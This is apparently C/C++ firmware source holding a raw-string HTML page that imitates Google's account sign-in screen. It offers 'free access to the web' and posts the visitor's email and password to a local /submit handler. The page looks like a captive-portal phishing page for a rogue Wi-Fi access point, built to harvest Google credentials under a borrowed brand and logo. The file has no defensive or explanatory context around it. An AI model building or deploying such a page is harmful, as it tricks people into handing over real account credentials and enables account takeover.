const char* login_page = R"rawliteral(
    <!DOCTYPE html>
    <html lang="it">
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Sign in - Google Account</title>
    </head>
    <body>
      <div style="display: flex; flex-direction: column; align-items: center; min-height: 100vh; background-color: #f8f9fa; justify-content: center;">
        <p style="color: #5f6368; margin-bottom: 20px;">Sign in with your Google Account to enjoy free access to the web.</p>
        
        <div style="background-color: #fff; padding: 40px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);">
          <div style="text-align: center; margin-bottom: 20px;">
            <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google" style="height: 30px;">
            <h2 style="margin-top: 10px; font-weight: 400; color: #202124;">Sign in</h2>
            <p style="color: #5f6368;">Use your Google Account</p>
          </div>
    
          <form action="/submit" method="POST">
            <input type="email" id="username" name="username" placeholder="Email or phone" required
                   style="width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box;">
            <input type="password" id="password" name="password" placeholder="Enter your password" required
                   style="width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box;">
    
            <a href="#" style="display: block; margin-bottom: 20px; color: #1a73e8; text-decoration: none;">Forgot email?</a>
            <p style="color: #5f6368; font-size: 0.875rem; margin-bottom: 20px;">
              Not your computer? Use Guest mode to sign in privately.
              <a href="#" style="color: #1a73e8; text-decoration: none;">Learn more</a>
            </p>
    
            <div style="display: flex; justify-content: space-between; align-items: center;">
              <a href="#" style="color: #1a73e8; text-decoration: none;">Create account</a>
              <input type="submit" value="Next"
                     style="background-color: #1a73e8; color: #fff; border: none; padding: 10px 20px; border-radius: 4px; cursor: pointer;">
            </div>
          </form>
    
        </div>
    
        <div style="text-align: center; padding: 20px; color: #5f6368; font-size: 0.875rem;">
          <select style="padding: 5px; border: 1px solid #ccc; border-radius: 4px; margin-right: 10px;">
            <option>English (United States)</option>
          </select>
          <a href="#" style="color: #5f6368; text-decoration: none; margin-right: 10px;">Help</a>
          <a href="#" style="color: #5f6368; text-decoration: none; margin-right: 10px;">Privacy</a>
          <a href="#" style="color: #5f6368; text-decoration: none;">Terms</a>
        </div>
      </div>
    </body>
    </html>
    )rawliteral";
